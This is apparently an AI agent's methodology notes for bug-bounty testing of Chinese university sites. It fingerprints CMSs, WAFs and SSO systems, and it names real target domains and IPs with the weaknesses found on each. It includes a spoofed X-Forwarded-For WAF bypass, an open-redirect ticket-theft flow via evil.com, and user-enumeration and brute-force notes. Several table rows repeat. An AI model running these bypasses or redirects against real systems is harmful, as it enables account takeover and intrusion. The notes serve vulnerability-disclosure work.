| **beego 2.0.0 (Go Web框架)** | 404页面含"Powered by beego 2.0.0", Go后端, JWT token认证, `middleware.go`源码路径泄露 | 用户枚举(登录API错误差异), 凭证URL明文传输(GET /api/user/login/{user}/{pass}), MySQL错误信息泄露, 注册接口主键冲突泄露表结构 | **中** — Go后端通常使用参数化查询(防SQLi), 但配置错误常见 |
| **EduManager (Go教育管理系统)** | beego框架, Vue.js SPA前端, `E:/workspace/src/EduManager/`路径泄露, `/api/user/login/{user}/{pass}` GET登录 | 用户枚举, 凭证URL泄露, MySQL错误泄露, 源码路径泄露, MariaDB/Redis端口暴露 | **中** — 需密码爆破或数据库空密码才能突破 |
| **拓扑软件平台** | `拓扑软件` in title, swagger-ui/.git/druid返回200+空body, 404自定义页 | 就业/研究生管理系统, 反代层拦截敏感路径 | **低** — 200空body非真实端点 |
| **CAS lyuapServer (联创天空)** | Server: nginx, `/lyuapServer/login`(SPA), `ly-iap-cas-ui` in JS paths, `dengzijian@ly-sky.com` dev email, `X-Application-Context: ly-gateway-server-svc:1101`, SM2加密, 钉钉/微信集成 | 用户枚举(`/lyuapServer/v1/tickets` POST form-data: NOUSER vs PASSERROR), 验证码未生效(`/lyuapServer/kaptcha`返回-1), 短信API(`/lyuapServer/v2/sendSms`需appid), 网关信息泄露(`/auth/*`泄露X-Application-Context) | **中** — 用户枚举+验证码缺失可暴力破解 |
| **beego 2.0.0 (Go Web框架)** | 404页面含"Powered by beego 2.0.0", Go后端, JWT token认证, `middleware.go`源码路径泄露 | 用户枚举(登录API错误差异), 凭证URL明文传输(GET /api/user/login/{user}/{pass}), MySQL错误信息泄露, 注册接口主键冲突泄露表结构 | **中** — Go后端通常使用参数化查询(防SQLi), 但配置错误常见 |
| **EduManager (Go教育管理系统)** | beego框架, Vue.js SPA前端, `E:/workspace/src/EduManager/`路径泄露, `/api/user/login/{user}/{pass}` GET登录 | 用户枚举, 凭证URL泄露, MySQL错误泄露, 源码路径泄露, MariaDB/Redis端口暴露 | **中** — 需密码爆破或数据库空密码才能突破 |
| **Dify AI Chatbot** | `difyChatbotConfig`, `chatbotConfig`, `token:` + `baseUrl:` | 前端widget token公开设计, API 401鉴权 | **极低** — 非漏洞 |
| **escSSO (企业级统一认证)** | `/sso/login`, jQuery 1.7.2, `escSSO/escsso.css`, auth types: pwd/otp/SMS/AD/LDAP/RSA/UKey, LT ticket, `randomCode` captcha | JSESSIONID URL leak(POST /sso/login → Location含jsessionid), OPTIONS暴露TRACE方法, jQuery已知XSS CVE | **低** — JSESSIONID需用户交互利用 |
| **SUDY CMS Actuator Proxy** | `/actuator/*` → 302 → `/actuator/*/main.psp`, wengine-auth-failed.png on 502 | Actuator端点被SUDY CMS代理重写为.psp, 实际数据不可访问; .psp版本返回"提示信息"错误页 | **不可提交** — 302重定向到.psp不代表actuator暴露 |
| **SUDY CMS Admin IP变量泄露** | `/admin/login.psp` → 200或410, `ipAddress` hidden field | 部分部署泄露服务器内网IP(10.x.x.x), 部分部署反射客户端IP, 部分返回127.0.0.1; **必须用curl ifconfig.me验证** | **低** — 只有确认为服务器内网IP时才提交 |
| **加速乐 CDN** | `X-Via-JSL` header, `__jsluid_s` cookie, `static.jiasule.com/static/js/http_error.js` in error pages, `X-Cache: error` | WAF拦截, 非标准端口返回400 Bad Request, 所有端口(80-10000)均经CDN转发 | **低** — CDN层保护, 直接IP不可达 |
| **DianCMS (点讯CMS)** | ASP.NET 4.0, `X-AspNet-Version: 4.0.30319`, `/model.aspx?modelid=N`, `/user/login.aspx`, `/admin/index/login.html`, `DianCMS_$` JS函数, `/upload/` 403, `/config/` 403 | model.aspx参数注入测试, 后台无验证码暴力破解(t0/t1参数名), 文件上传(403保护) | **中** — 需找到后台登录入口和弱口令 |
| **人事人才招聘系统 (rsfw)** | `zp.XXX.edu.cn/rsfw/sys/zpglxt/`, `_WEU` cookie (rums/b WAF), `route` cookie | 外网入口 `/extranet/index.do`, CORS `*` 全局(含302重定向), JSESSIONID URL泄露, 登录页CORS *但API返回HTML非JSON | **低** — CORS *但API返回HTML页面, 无法跨域读取敏感数据 |
| **VAC安全控制系统** | Vue 3 + Vite SPA, `/assets/index.*.js`, `__vite_is_modern_browser` | 前端SPA, 需登录才能访问API | **低** — SPA架构, 无公开API |
| **CAS PAC4J** | JSESSIONID in URL paths (`/cas/js/cas.js;jsessionid=XXX`), `PAC4JDELSESSION` cookie, Bootstrap 4.1.0 + jQuery 3.3.1, WeChat OAuth (wxLogin.js), CSP frame-ancestors, HSTS | **Open Redirect** (service参数无白名单校验), JSESSIONID URL泄露(低价值), WeChat AppID泄露(公开设计) | **中** — Open Redirect可窃取CAS ticket实现账户接管 |
| **Fractal Technology CMS** | `<!--auther>孙</auther-->` HTML注释, `meta author: http://www.fractal-technology.com`, PHPSESSID, `/Public/static/themes/cad/` 路径 | 静态CMS,无登录/API/上传,搜索重定向百度 | **极低** |
| **校外访问系统 (webexp)** | `/login/` Vue.js SPA, APISIX网关, `校外访问系统` | 统一CAS认证入口,防护良好 | **低** |
| **致远OA (Seeyon)** | `/seeyon/index.jsp`, `V8_0SP1` or `V8_0SP2` in CSS/JS path, Server: SY8045 | `/seeyon/management/index.jsp`(管理后台), `_SecuritySeed` DES加密. **V8.0SP2 (build 2025-10-20+)已完全修补**: 所有已知CVE路径404, REST API需认证, CORS *但无实际影响 | 高 (旧版本), **不可提交** (V8.0SP2已修补) |
| **校外访问系统 (webexp)** | `/login/` Vue.js SPA, APISIX网关, `校外访问系统` | 统一CAS认证入口,防护良好 | **低** |
| **致远OA (Seeyon)** | `/seeyon/index.jsp`, `V8_0SP1` or `V8_0SP2` in CSS/JS path, Server: SY8045 | `/seeyon/management/index.jsp`(管理后台), `_SecuritySeed` DES加密. **V8.0SP2 (build 2025-10-20+)已完全修补**: 所有已知CVE路径404, REST API需认证, CORS *但无实际影响 | 高 (旧版本), **不可提交** (V8.0SP2已修补) |

| **APISIX + WebExp 统一认证** | openresty + `Powered by APISIX`, 302到`webexp.*.cn/login/login?externalIds=` | CAS/WeCom/支付宝/微信登录, CORS仅允许自身域名, 账号/IP锁定策略 | **中** — 所有子域名统一走此网关, 漏洞在网关层而非业务层 |
| **多站点CMS (?id=切换)** | 同一域名下`?id=N`切换不同子站点(如世界戏剧教育联盟、教育基金会等) | 静态页面为主, `?id=`参数通常为整数, SQLi测试无差异响应 | **低** — 多为静态内容, 无敏感数据 |
| **SSO统一身份认证 (自研/第三方)** | `/sso/login`, OAuth2/OIDC, `INGRESSCOOKIE`, `DEVICE_ID` cookie | 内部路径泄露(404错误返回内部服务名如`/sso-apis-v3/`), SMS API枚举, 注册页面暴露 | **中** — 可泄露内部架构, 辅助后续攻击 |
| **Coremail XT5 邮件系统** | `/coremail/`, `/coremail/common/index_cmxt50.jsp`, `Copyright 2000 - 2020/2023 Mailtech` | admin模块禁用(`Invalid module admin`), 用户枚举需正确API格式, 版本泄露 | **低** — admin模块已禁用, 攻击面有限 |
| **Apache Shiro + Spring Boot OA** | `rememberMe=deleteMe` cookie, OASESSIONID, AngularJS SPA(`data-ng-app`), CORS `*` | Shiro反序列化(CVE-2016-4437需密钥), CORS通配符跨域窃取, rememberMe默认密钥测试 | **中** — Shiro默认密钥20+个需逐一测试, CORS `*`可跨域读取 |
| **金智教育(wisedu) CAS** | Server: wisedu, `/authserver/login`, `Unified identity authentication platform`, `encrypt.js`(SM2), `/authserver/cumt/static/` | CAS协议端点暴露(/serviceValidate, /proxyValidate), 用户枚举("账号未激活"), 泄露其他学校authserver, Spring Boot Actuator | **中** — CAS端点泄露+用户枚举+Actuator暴露 |
| **金智教育 ycServer (wisedu minos) CAS** | 自定义主题 `/authserver/<schoolTheme>/static/`, `com.wisedu.minos.*` 硬编码, `DEFAULT_SALT` in login.js, `.htl` API扩展名, `_vesi` cookie, openresty反代 | CORS预检反射型配置错误(所有端点), Spring Boot堆栈跟踪泄露(execution参数), CAS Open Redirect(嵌套callback URL), QR码登录流程, tenant/info泄露配置, WAF 200误报模式 | **中** — CORS+堆栈跟踪+URL重定向可组合实现账户劫持 |
| **SUDY WebPlus CMS** (苏迪科技) | `sudy-wp-siteId`, `_js/_portletPlugs/sudyNavi/`, `.psp`页面, `_web/_ids/login/api/`, `_web/_portal/api/`, `_web/_search/api/` | IDS登录API(`_web/_ids/login/api/login/create.rst`), Portal PSP文件(`_web/_portal/api/*/main.psp`), 搜索API, **admin/login.psp 410页面泄露服务器真实IP**(216.195.192.148等), `_p` Base64参数, visitcountdisplay端点 | **中** — IDS API+错误页面IP泄露+admin 410 IP泄露 |

### APISIX + WebExp 统一认证门户模式 (2026-05-27 中央戏剧学院实战)

**触发条件:** 子域名302重定向到 `webexp.*/login/login?externalIds=xxx&custom=N&returnUrl=...`, 响应头含 `openresty` + `Powered by APISIX`

**识别特征:**
- 所有受保护子域名(ehall/cwc/maxkb/changping等)统一302到同一登录门户
- 登录门户为Vue.js SPA, JS路径: `/login/assets/index-*.js`
- API路径: `/api/access/authentication/*`, `/api/access/user/*`, `/api/authentication/conf`

**测试命令:**
```bash
# 获取认证方式列表(无需登录)
curl -sk "https://webexp.XXX.cn/api/access/authentication/list"

# 获取所有认证方式(含外部认证)
curl -sk "https://webexp.XXX.cn/api/access/authentication/all"

# 获取密码认证配置
curl -sk "https://webexp.XXX.cn/api/access/password-auth"

# 获取安全配置(IP锁定/账号锁定/会话超时)
curl -sk "https://webexp.XXX.cn/api/authentication/conf"

# 获取页面自定义配置
curl -sk "https://webexp.XXX.cn/api/access/authentication/page-custom-detail?id=0"

# 测试用户信息接口(需认证)
curl -sk "https://webexp.XXX.cn/api/access/user/info"
# 返回 {"code":100009,"message":"未授权","data":null} = 正常鉴权
```

**安全配置泄露内容(公开接口):**
- `ipAuthLockConf`: IP锁定策略(默认10次失败锁600秒)
- `accountAuthLockConf`: 账号锁定策略(默认5次失败锁600秒)
- `sessionConf`: 会话超时(默认604800秒=7天)
- `followWeChatOfficialConf`: 微信公众号配置(通常为空)

**判定:** 这些配置接口返回安全策略信息, 属于公开设计, 不建议单独提交。只有在发现认证绕过、弱密码策略、或会话劫持时才报告。

### 新增WAF类型 (2026-05-20)

| WAF | 识别特征 | 拦截行为 |
|-----|---------|---------|
| NNUTC CLOUD | Server: NNUTC CLOUD | 所有子域名返回Error页面 |
| 宝塔网站防火墙免费版 | `<title>宝塔网站防火墙免费版</title>` | XSS/SQLi拦截, 事件处理器可通过 |
| **ADG-200-11 (安恒WAF)** | 响应体含 `ADG-200-11`, HTTP 403 | 安恒信息WAF, 拦截所有请求, 绕过困难 |
| **saaswaf.com** | CNAME指向saaswaf.com | SaaS WAF, 拦截常见攻击 |
| **APISIX (openresty)** | 响应头 `Powered by APISIX`, openresty | API网关, 统一认证入口 |
| rump/c | Server: rump/c | 博达CMS部署, 搜索API返回404 |
| **WAF 200误报 (访问禁止)** | HTTP 200 + `<TITLE>访问禁止</TITLE>` + `检测到可疑访问，事件编号：XXXXXXXXX` | 对.git/.sql/swagger/web.config返回200而非403/404，导致扫描工具误报。必须检查body内容 |

### ⚠️ WAF绕过: X-Forwarded-For头 (2026-05-31 gxdlxy.com实战)

部分中国教育网站WAF(如rums/b反代)可用 `X-Forwarded-For: 127.0.0.1` 或 `X-Real-IP: 127.0.0.1` 头临时绕过:
```bash
# 被WAF封禁的站点，加XFF头后可访问
curl -sk -H 'X-Forwarded-For: 127.0.0.1' 'http://college.school.edu.cn/'
```
- 不稳定：WAF在大量扫描后可能再次封禁
- 适用于初始访问被封禁的二级学院子域名站点
- 绕过后正常follow HTTP→HTTPS重定向
- 已知有效目标: gxdlxy.com (广西电力职业技术学院) 各二级学院子域名

### Fractal Technology CMS (2026-05-27 中央戏剧学院)
- **识别特征**: `<!--auther>孙</auther-->` HTML注释, `meta author: http://www.fractal-technology.com`, PHPSESSID, `/Public/static/themes/cad/` 路径
- **技术栈**: PHP, jQuery 1.11.3, 静态HTML生成
- **攻击面**: 极小 — 无登录、无API、无文件上传、搜索重定向到百度
- **路径模式**: `/cn/` 中文版, `/en/` 英文版, `/detail/{id}.html` 文章页, `/cn/recruit/*/detail/{id}.html` 招生页
- **WAF**: CNAME指向saaswaf.com
- **实战**: chntheatre.edu.cn
- **结论**: 静态CMS,攻击面极小,不建议深挖

### 校外访问系统 (webexp) — Vue.js SPA 登录门户 (2026-05-27)
- **识别特征**: `/login/` 路径, Vue.js SPA, APISIX网关(openresty), `校外访问系统` 标题
- **API端点**: `/api/access/user/info`(需认证), `/api/access/authentication/list`(认证方法), `/api/authentication/conf`(安全配置)
- **认证方式**: CAS + WeCom(企业微信), 可能有支付宝/微信登录
- **CORS**: 仅允许自身域名, Access-Control-Allow-Credentials: true
- **特征**: 统一CAS登录, 所有子域名302重定向到webexp登录
- **实战**: webexp.zhongxi.cn (中央戏剧学院)
- **结论**: 标准校外访问系统,防护良好,需CAS认证才能访问内部系统

### ⚠️ 网瑞达 wengine-auth 代理保护模式 (2026-06-02 cust.edu.cn实战)

部分高校使用网瑞达WebVPN(wengine-auth)作为统一认证代理层，所有内部系统(ehall/jwc/cxcy/debot/chat等)通过此网关代理访问。

**识别特征**:
- 302重定向到: `https://wwwn.XXX.edu.cn/wengine-auth/login?id=XXX&path=/&from=https://TARGET/`
- Set-Cookie: `wengine_new_ticket=XXX`
- Server: `none`

**影响**:
- ehall JSONP API (`/jsonp/serviceCenterData.json`等) 不可直接访问，必须先通过CAS认证
- 所有被保护的子域在未认证状态下302到CAS登录页
- wengine-auth自身的API (`/wengine-auth/api/`) 返回403

**测试命令**:
```bash
# 检查是否被wengine-auth保护
curl -sk -D- "https://ehall.XXX.edu.cn/" | grep "wengine-auth"
# 返回: Location: https://wwwn.XXX.edu.cn/wengine-auth/login?id=104&path=/&from=https://ehall.XXX.edu.cn/

# 检查wengine-auth网关自身
curl -sk -D- "https://wwwn.XXX.edu.cn/" | head -10
# 返回: Location: /login?fromUrl= + Set-Cookie: wengine_new_ticket=XXX
```

**判定**: 如果ehall被wengine-auth保护，ehall JSONP API无法直接测试，需要先获取CAS凭证。不要浪费时间测试ehall JSONP端点。

**已确认案例**: 长春理工大学(cust.edu.cn) — ehall/jwc/cxcy/debot/chat全部被wengine-auth保护。详见 `references/cust-edu-testing-patterns.md`。

### ⚠️ CAS Apereo + PAC4J Open Redirect模式 (2026-06-02 cust.edu.cn实战)

部分高校使用Apereo CAS + PAC4J框架，存在service参数Open Redirect漏洞。

**识别特征**:
- `PAC4JDELSESSION` cookie
- `clientredirect;jsessionid=` 路径
- 微信/QQ OAuth集成 (`wxLogin.js`)
- `_eventId=submit/resetPassword` 表单参数

**漏洞**: CAS登录页的service参数无白名单校验，接受任意外部域名。

**测试命令**:
```bash
# 确认外部域名被接受
curl -sk "https://cas.XXX.edu.cn/cas/login?service=https://evil.com/" | grep -c "evil.com"
# 返回>0 = 漏洞存在

# 检查form中service参数
curl -sk "https://cas.XXX.edu.cn/cas/login?service=https://evil.com/" | grep -oE 'service=[^"'"'"' ]+'
```

**攻击流程**:
1. 构造: `https://cas.XXX.edu.cn/cas/login?service=https://evil.com/collect`
2. 用户登录后CAS重定向到: `https://evil.com/collect?ticket=ST-XXXXX`
3. 攻击者用ticket访问: `https://portal.XXX.edu.cn/callback?ticket=ST-XXXXX`

**报告角度**: "CAS统一认证系统存在Open Redirect漏洞可窃取用户凭证" [中危]

**已确认案例**: 长春理工大学(mysso.cust.edu.cn) — 接受evil.com/google.com/baidu.com等任意域名。详见 `references/cust-edu-testing-patterns.md`。

### ⚠️ 412 Precondition Failed 反爬虫系统 (2026-05-28 cdut.edu.cn实战)
部分中国高校使用反爬虫系统(非WAF)，返回HTTP 412:
- 响应体含XHTML DOCTYPE + 混淆JS (`$_ts` 变量, meta content反爬token)
- Set-Cookie: 随机名称cookie (如 `sMLAeTqisZbFO=...`)
- Server头可能被隐藏 (`******`)
- 所有子域统一返回412 → 反爬系统全站生效
- **与WAF 403区别**: 403拦截攻击payload，412拦截自动化工具(所有请求)
- **应对**: 需要browser工具访问获取cookie后curl复用cookie，或直接用browser工具测试
- **已知实例**: cdut.edu.cn (成都理工大学) 202.115.x.x CERNET

### ⚠️ CERNET目标避免delegate_task并行 (2026-05-28 cdut.edu.cn教训)
当目标是CERNET教育网(202.x.x/211.x.x/125.x.x)且从非CERNET IP测试时:
- delegate_task子agent的HTTP请求也会超时/412
- 3个子agent各超时900s = 浪费45分钟
- **正确做法**: 先用单个快速curl确认可达性，只有确认可达后才用delegate_task
- **不可达时**: 立即转向可达的少数子域逐个测试，不要并行
- **412目标**: 所有子域统一412时，整个域名的自动化测试基本无效，直接结论

### ⚠️ 反向代理空200误报模式 (2026-05-28 whut.edu.cn实战)
当多个子域对敏感路径(swagger-ui.html/.git/HEAD/druid/actuator/api-docs)统一返回HTTP 200 + Content-Length: 0时, 这是**反向代理/WAF的统一拦截行为**, 不是真实端点暴露。

**识别方法**:
- 敏感路径返回200但body为0字节
- 随机路径返回404
- 多个子域有完全相同的模式
- Content-Type可能是application/json但body为空

**验证关键**: 只有当swagger返回实际JSON、git返回ref内容、druid返回管理页面时才算真实暴露。空200不报告。

**已确认案例**: 武汉理工大学(whut.edu.cn)所有子域共享此反向代理配置。详见 `references/whut-edu-cernet-reverse-proxy-pattern-20260528.md`。

### ⚠️ Sangine aTrust 2.0 VPN识别
Sangine aTrust 2.0是深信服VPN的Web门户版本, 区别于传统Sangfor EasyConnect:
- 响应头: `server: Sangine`
- 标题: `aTrust 2.0`
- 页面: Vue.js SPA + Pinia状态管理
- 特征: SDPC代理客户端、防卸载功能、SPA安全码验证
- JS文件: `assets/userStatus.*.js`, `assets/auth_utils.*.js`, `assets/connect_setting.*.js`
- CSP: 限制为自身+飞书+阿里+微信+QQ CDN

### ⚠️ 网瑞达资源访问控制系统 (WebVPN)
网瑞达WebVPN:
- Cookie: `wengine_vpn_ticket<域名>`
- JS: `/wengine-vpn/js/` (jQuery + layui + aes-js.js + drag.js)
- 登录: `/login` (CSRF + AES密码加密 + 双因素认证)
- API: 所有`/api/*`端点返回403 (WAF拦截)
- 版本标记: `20200501`

### ⚠️ CERNET防火墙端口过滤
部分CERNET高校IP在网关层过滤所有非HTTP端口:
- nmap扫描所有端口返回filtered
- 仅80/443通过反向代理可达
- SSH/FTP/数据库等服务完全不可从外网访问
- 识别: nmap -Pn -sT 所有端口no-response

### ⚠️ 域名已出售/过期检测
批量扫描中发现多个学校域名已出售或过期:
- hnsw.cn → "此域名正在出售中"
- jxsf.cn → "此域名出售或转让"
- hbty.cn → "此域名正在出售中"
- gxdy.cn → 域名已出售, 非学校网站
- fqyz.net → "域名已过期"

**检测方法:** 检查页面标题是否包含"出售/转让/过期"关键字

### ⚠️ 第三方SaaS建站识别
部分学校使用第三方SaaS建站平台,无漏洞价值:
- gdhxxy.cn → wejianzhan.com(微建站)
- xyh.ecut.edu.cn → usho.cn/sosho.cn(校友网SaaS)

**识别方法:** 检查页面源码是否包含第三方平台域名

### ⚠️ Dify AI Chatbot Token 前端泄露误报
当目标前端出现 `difyChatbotConfig = { token: 'xxx', baseUrl: 'https://xxx' }` 或 `window.chatbotConfig` 时：
- 这是Dify聊天机器人前端widget的**公开集成token**，设计上暴露给浏览器
- Dify API（`/v1/chat-messages`等）即使携带该token也返回401 Unauthorized
- `Access-Control-Allow-Origin: *` 是Dify默认配置
- **不建议提交**，详见 `src-vuln-hunting` skill 的 Dify Chatbot Token 误报章节

### ⚠️ 200空Body反向代理/WAF拦截模式
部分高校对敏感路径(swagger-ui/.git/druid/actuator)返回HTTP 200但Content-Length: 0：
- 与标准403/404不同，无法从状态码判断是否被拦截
- **验证方法**：比较敏感路径和随机路径状态码。敏感路径200+空body而随机路径404 = 被代理拦截
- **不建议提交**：无实际内容泄露
- 若body非空（返回实际swagger/druid/git内容），则为真实漏洞

### 已知CMS指纹库

| CMS | 识别特征 | 常见漏洞 | 测试优先级 |
|-----|---------|---------|-----------|
| 博达CMS | Visual SiteBuilder, _sitegray/, /system/resource/ | 搜索SQLi, 文件上传 | 中 |
| 金智教育(ehall) | ehall.xxx.edu.cn, /jsonp/school.json | 未授权API, 教职工信息泄露 | 高 |
| BoCaiCMS | X-Powered-By: BoCaiCMS, /admin.php | 管理后台暴露, SQLi | 中 |
| SUDY CMS | sudy-jquery, /_js/_portletPlugs/ | 搜索接口, 文件上传 | 中 |
| LyWebServer | Server: LyWebServer, var lysid= | **未授权文件上传(CVSS 10.0)**, CORS | **最高** |
| **CAS lyuapServer (联创天空)** | React SPA前端, `/lyuapServer/login`, `/assets/js/app.<hash>.js`, `dingtalk.open.js`, `vsConsole.js`, `ly-gateway-server-svc`, `__jsluid_s` cookie | 用户枚举(POST form-data到/v1/tickets: 存在用户返回"系统内部错误"/PASSERROR, 不存在返回NOUSER), 密码错误计数泄露(PASSERROR data=N递增), 网关服务名泄露(X-Application-Context), SMS API需appid验证 | **中** — 用户枚举+计数泄露可提交, 网关信息泄露低危 |
| **Fractal Technology CMS** | `<!--auther>孙</auther-->`, `/Public/static/themes/cad/`, `saw_terminal` cookie, PHPSESSID, 搜索重定向到百度site: | 静态CMS, 攻击面极小; 多站点用`?id=`切换; 搜索功能重定向外部 | **低** |
| 自研PHP | 各种自定义路径 | 弱口令, SQLi, 文件上传 | 高 |
| Spring Boot | /actuator, Java错误信息 | Actuator泄露, 未授权API | 高 |

**LyWebServer CMS 详细测试模式**: 见 `references/lywebserver-cms-testing.md`

- `references/whut-edu-cernet-reverse-proxy-pattern-20260528.md` — 武汉理工大学whut.edu.cn测试记录：反向代理空200误报模式(swagger/.git/druid/actuator全部返回200+0B)、CERNET防火墙端口过滤、Sangine aTrust 2.0 VPN指纹、网瑞达WebVPN指纹、221子域名资产清单、subfinder vs DNS暴力枚举差异、大部分高价值系统CERNET-only不可达的结论。
- `references/sudy-webplus-cms-testing-patterns.md` — SUDY WebPlus CMS (苏迪科技) testing patterns: fingerprint (`sudy-wp-siteId`, `.psp` pages, `sudyNavi`), search API (`/_web/_search/restful/api/search.rst` with `_p` base64 parameter), 493 WAF response pattern, 403 IP/connectionId leak, admin backend 410 with `ipAddress` hidden field, SM2 encryption, attack surface assessment (low value — public content + infra info leak only).
- `references/saif-sjtu-edu-testing-patterns.md` — SAIF (上海高级金融学院) testing patterns: CORS `*` with custom auth token headers (Ttoken/Stoken/Mtoken/Appid), SSO internal path disclosure (`/sso-apis-v3/`), Matomo/Piwik analytics exposure, 12 subdomains (alumni/apply/portal/sso/support/wiki/analytics/admin/mail/vpn/hr/mobile), PHP 5.4.16, upload directories 403.
- `references/lycvc-post-upload-negative-20260523.md` — 临沂城市职业学院 LyWebServer `/api/cms/upload` 已提交后的续挖负证据包
- `references/lycvc-new-api-endpoints-and-cors-20260528.md` — lycvc 新发现API端点(`/api/channel/tree`、`/api/article/search`)和系统性CORS漏洞，可独立于已提交的upload漏洞：记录 `lysid=1930900465347256321`、公开 JS 仅暴露 captcha/upload/hits、captchaImage CORS 低价值、feedback 参数错误、hits 统计刷量低危、站内搜索静态同 hash 无 SQLi、JSP/Visual SiteBuilder 老路径 404、DNS 超时时用 `curl --resolve lycvc.linyi.cn:443:120.220.31.123` 固定解析复测、常见学校系统子域未发现；强调上传根因只补原报告，不新建重复报告，只有新未授权敏感数据/认证绕过/SQLi/RCE/业务写入影响才提交。
- `references/lianyi-systemsetting-header-auth-bypass.md` — 连一/事务中心 `systemSetting` 请求头信任鉴权缺失模式：从 JS 提取 `/api/authc/systemSetting/` 与 `/api/docrepo/download`，用无头请求 400 与伪造 `Loginuserorgid/Loginuserid` 后 200 做对照，验证配置详情与附件下载，同时用其它业务接口 302/会话错误过滤“全站认证绕过”过报。
- `references/vue-smart-campus-portal-recon.md` — Vue/webpack 智慧校园门户侦察模式：解析 `envConfig.js`/lazy chunks/remoteEntry，提取 CAS、消息中心、表单流、OA 内网链接等 API 线索，并区分可提交漏洞与仅能作为深挖线索的 CORS/前端配置暴露。
- `references/supwisdom-transaction-unauth-statistics.md` — Supwisdom/智慧校园事务中心未授权统计接口模式：从 single-spa/import-map 和 `/ttcAdmin/app.js` 提取 `/ttc/api/ttc/*`、`/ttc/v1/service/*`，验证 `transactionType/getTransactionTypeList`、`service/monitor/*` 是否无需登录返回校内流程配置、业务办理量和SQL异常；强调用同系统 `token信息不存在` 接口做鉴权对照，避免把 SPA fallback/CORS 通配符当主漏洞。
- `references/pentest-framework-education-module-hardening.md` — 将教育SRC/Supwisdom经验固化进 `/root/pentest-framework` 时的模块化实现模式：`pf edu` 低影响探测、Supwisdom `/ttc/` API候选、误报过滤和 `pf gate --edu` 报告质量门禁规则。
- `references/shupl-edu-recon-20260521.md` — 上海政法学院 shupl.edu.cn 低影响侦察记录：SUDY CMS、ehall taskcenter、ASP.NET 招生后台、IIS 假 200/trace.axd 禁用页等过滤结论，以及慢高校目标探测时要小批量、流式落盘，避免把后台暴露/公开接口错误响应凑成低质量报告。
- `references/cdp-post-ignore-deepening.md` — 成都职业技术学院漏洞被忽略后的深挖收敛记录：连一 systemSetting 仅低敏配置/logo 附件、jy 邮箱验证码/密码找回链未证明接管、CAS api-docs 仅低价值错误信息；强调被忽略后不要硬刚，只有补到真实业务数据/写操作/账号接管才重新提交。
- `references/cdp-mcp-followup-negative-20260522.md` — 成都职业技术学院 MCP 辅助续挖负证据包：记录 HexStrike/Burp MCP 使用边界、yikatong/ehall/CAS/边缘子域/mail 复测结果、不要提交原因和重新投入条件。
- `references/cust-edu-testing-patterns.md` — 长春理工大学 cust.edu.cn 测试模式：wengine-auth代理保护、CAS Apereo+PAC4J Open Redirect、致远OA公网暴露+CORS、Astraeus VPN、博达CMS/JeeCMS指纹、50+子域枚举结果。
- `references/gxdlxy-edu-testing-patterns.md` — 广西电力职业技术学院 gxdlxy.com 测试模式：金智教育ycServer CAS(_vesi cookie)、zp.gxdlxy.com招聘系统(rsfw路径+CORS *+JSESSIONID URL泄露)、vac.gxdlxy.com VAC安全控制系统(Vue 3+Vite SPA)、xy.gxdlxy.com校友系统(Vue SPA+XSRF-TOKEN)、博达CMS主站、Astraeus VPN、23子域枚举结果。
- `references/sxri-edu-testing-20260601.md` — 陕西铁路工程职业技术学院 sxri.net 测试记录：CAS lyuapServer用户枚举(form-data POST /v1/tickets: 系统内部错误/PASSERROR vs NOUSER)+密码错误计数泄露+无速率限制, SUDY CMS admin/login.psp 410页面泄露服务器IP(216.195.192.148), Portal robots.txt泄露内网IP(192.168.2.49), 泛微OA API需认证(/api/ec/dev/crud/*), BshServlet 500, Liferay 4.0.0 CE (2013) JSONWS需认证.
- `references/cust-edu-testing-patterns.md` — 长春理工大学 cust.edu.cn 测试模式：PAC4J CAS Open Redirect(中危,已提交), 网瑞达WebVPN保护ehall/jwgl等核心系统, Seeyon OA V8.0SP2已打补丁(所有已知CVE路径404), 200+子域名, 博达CMS静态站点, JeeCMS管理后台404, 外部IP 121.37.5.226:8090(IIS+Seeyon)和114.116.241.75:8020(404).
- `references/seeyon-v8sp2-patched-negative-20260602.md` — 致远OA V8.0SP2(build 2025-10-20)负证据包：wpsAssistServlet/htmlofficeservlet/ajax.do/test123456.jsp/downloadServlet/autoinstall.do全部404, thirdpartyController.do 200空body但SSRF无效, REST API全部401或"被迫下线", CORS *但API需认证无法利用; 决策：V8.0SP2已完全修补，除非新CVE否则不测试.
- `references/xjjtedu-testing-patterns.md` — 新疆交通职业技术大学 xjjtedu.com 测试模式：蓝盾CAS+Tomcat7+Shiro+CoCall(Thunisoft), 11个漏洞(高1/中6/低4), 关键:无账号锁定+验证码明文泄露+CAS开放重定向+客户端验证码校验+密保逻辑缺陷+CoCall CORS, 真实IP:124.119.15.220/215, 50+子域.
- `references/ehall-jinzhi-api-enumeration.md` — 金智教育ehall API枚举
- `references/jtopcms-unauthenticated-upload.md` — JTopCMS/Java CMS `.thtml` school sites: public `commonUtil.js` exposes `content/multiUpload.do`; verify `/core/SystemManager/login/page.thtml` is privileged, then prove unauthenticated multipart upload returns `fileUrl`/`resId` and public `/tyyz/file/YYYY-MM-DD/...` access. Includes placeholder-URL pitfall, `Set-Cookie` explanation, safe HTML control-page PoC boundary, and cleanup guidance; do not overclaim HTML/JS execution, do not upload malware/backdoors, and do not guess delete endpoints.
- `references/lywebserver-cms-testing.md` — LyWebServer CMS漏洞测试模式(2026-05-20 临沂城市职业学院实战)
- `references/attack-demonstration-patterns.md` — 攻击演示模式(钓鱼页面/XSS/jQuery PoC)
- `references/jquery-cve-exploitation.md` — jQuery已知漏洞利用PoC(CVE-2020-11022/CVE-2019-11358/CVE-2015-9251)
- `references/file-upload-bypass-techniques.md` — 文件上传绕过技术(双扩展名/大小写/MIME类型)

## 实战经验补充 (2026-05-20 批量教育SRC)

### 学校域名查找策略
大部分学校.edu.cn域名DNS无记录或CERNET-only。查找正确域名:
1. 尝试常见变体: xxx.edu.cn, xxx.cn, xxx.com
2. 学校缩写变体: 如 hnswxy/hnsw, jxsf/jxstnu
3. 很多学校已被收购/停放: 检查标题是否含"出售"
4. 使用 crt.sh 证书透明度查询子域名

### 高价值CMS识别与攻击面
| CMS | 特征 | 攻击面 |
|-----|------|--------|
| SUDY CMS (苏迪科技) | `/_js/sudy-jquery-autoload.js`, `_sitegray` | 搜索API, DWR接口 |
| 博达CMS (Visual SiteBuilder) | `<!--Announced by Visual SiteBuilder 9-->` | 搜索API, 系统资源文件 |
| 金智教育 ehall | `/jsonp/school.json`, 302到CAS | `/jsonp/appIntroduction.json` 泄露PII |
| BoCaiCMS (博采) | `X-Powered-By: BoCaiCMS`, ThinkPHP | `/admin.php` 管理后台 |
| 致远OA (Seeyon) | `/seeyon/index.jsp` | `/seeyon/management/index.jsp` 管理后台 |

